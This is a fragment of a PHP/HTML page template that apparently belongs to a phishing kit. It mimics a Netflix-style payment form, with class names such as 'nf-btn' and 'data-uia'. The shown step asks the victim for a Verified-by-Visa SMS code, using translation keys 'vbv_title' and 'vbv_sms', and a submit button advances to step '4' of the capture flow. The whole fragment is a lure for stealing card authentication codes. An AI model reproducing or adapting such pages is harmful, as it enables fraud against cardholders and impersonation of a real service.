					...
					<div class="centerContainer firstLoad">
						<div data-uia="payment-form">
								...
								<div>
									<div class="stepHeader-container" data-uia="header">
										<div class="stepHeader" role="status">
											<h1 class="stepTitle" data-uia="stepTitle"><?php echo $traduce["$lang"]["vbv_title"];?></h1></div>
									</div>
												...
												<div data-uia="field-firstName+container" class="nfInput nfInputOversize">
													<div class="nfInputPlacement">
														<label class="input_id" placeholder="firstName">
															<input type="text" data-uia="field-firstName" name="firstName" class="nfTextField" id="vbv" value="" tabindex="0" autocomplete="cc-given-name" maxlength="100" minlength="1" dir="" placeholder="<?php echo $traduce["$lang"]["vbv_sms"];?>">
														</label>
													</div>
												</div>
											</li>
							...
							<div class="submitBtnContainer">
								<button type="submit" autocomplete="off" tabindex="0" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" onclick="submit('4')" data-uia="action-submit-payment" placeholder=""><?php echo $traduce["$lang"]["cc_button"];?></button>
							</div>
						</div>
					</div>
				</div>
